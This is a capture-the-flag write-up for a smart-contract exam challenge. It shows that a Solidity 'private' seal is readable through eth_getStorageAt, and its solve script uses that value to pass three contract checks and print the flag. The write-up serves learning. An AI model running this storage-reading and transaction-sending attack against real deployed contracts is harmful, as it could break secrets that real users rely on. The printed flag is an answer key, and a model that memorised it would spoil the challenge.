---
title: "ApprenticesEntryExam"
ctf: "MCTF 2026"
date: 2026-11-20
category: web
difficulty: easy
points: N/A
flag_format: "MCTF26{...}"
---

# ApprenticesEntryExam

## Summary

A three-question smart-contract exam. Question I asks for a `private` `seal`, but private
storage is still readable through `eth_getStorageAt`; Questions II and III only require an
exact payment and the caller's address modulo 1000.

## Solution

### Step 1: Locate the exam and read the private seal

`info` on the challenge manager gives the `Setup` contract. `Setup` exposes a custom getter
at selector `0x24ef2db3` that returns the exam address. The `seal` variable is declared
`private`, which only affects Solidity visibility — its value lives in storage slot 0 and
is returned verbatim by `eth_getStorageAt(exam, 0)`.

### Step 2: Answer all three questions and request the flag

Fund a fresh EOA once with `fund <address> 1`, then call `breakSeal(seal)`,
`payTuition()` with exactly `0.042 ether`, and `signRegister(mark)` where
`mark = uint256(uint160(msg.sender)) % 1000`. Finally send `flag` to the manager.

```python
import re, socket, time, requests
from web3 import Web3
from eth_account import Account
from Crypto.Hash import keccak

HOST, RPC = "10.240.3.103", "http://10.240.3.103:8545"
w3 = Web3(Web3.HTTPProvider(RPC))

def sel(sig):
    k = keccak.new(digest_bits=256); k.update(sig.encode())
    return "0x" + k.hexdigest()[:8]

def nc(cmd):
    s = socket.create_connection((HOST, 31337), timeout=8); s.settimeout(3)
    s.recv(4096)
    s.sendall((cmd + "\n").encode()); time.sleep(1.5)
    out = b""
    try:
        while True:
            d = s.recv(4096)
            if not d: break
            out += d
    except Exception:
        pass
    s.close()
    return out.decode(errors="replace")

# Setup address from the manager, then the exam address via Setup's getter
setup = w3.to_checksum_address(re.search(r"contract:\s*(0x[0-9a-fA-F]+)", nc("info")).group(1))
raw = w3.eth.call({"to": setup, "data": "0x24ef2db3"})
exam = w3.to_checksum_address("0x" + raw.hex()[-40:])

# Question I: private storage is public on-chain
seal = int.from_bytes(w3.eth.get_storage_at(exam, 0), "big")

# One-time faucet funding
acct = Account.create()
print(nc(f"fund {acct.address} 1"))
assert w3.eth.get_balance(acct.address) > 0

def send(data, value=0):
    tx = {
        "nonce": w3.eth.get_transaction_count(acct.address),
        "gasPrice": w3.eth.gas_price,
        "gas": 300000,
        "to": exam, "value": value, "data": data, "chainId": 31337,
    }
    signed = acct.sign_transaction(tx)
    receipt = w3.eth.wait_for_transaction_receipt(
        w3.eth.send_raw_transaction(signed.raw_transaction), timeout=30)
    assert receipt.status == 1

send(sel("breakSeal(uint256)") + seal.to_bytes(32, "big").hex())
send(sel("payTuition()"), w3.to_wei("0.042", "ether"))
mark = int(acct.address, 16) % 1000
send(sel("signRegister(uint256)") + mark.to_bytes(32, "big").hex())

print("passed:", w3.eth.call({"to": exam, "data": sel("passed()")}).hex()[-1])
print(nc("flag"))
```

Output (abridged):

```
passed: 1
| MCTF26{c9ngr4tz_0n_p4551ng_th3_f1r5t_3x4m} |
```

## Flag

```
MCTF26{c9ngr4tz_0n_p4551ng_th3_f1r5t_3x4m}
```
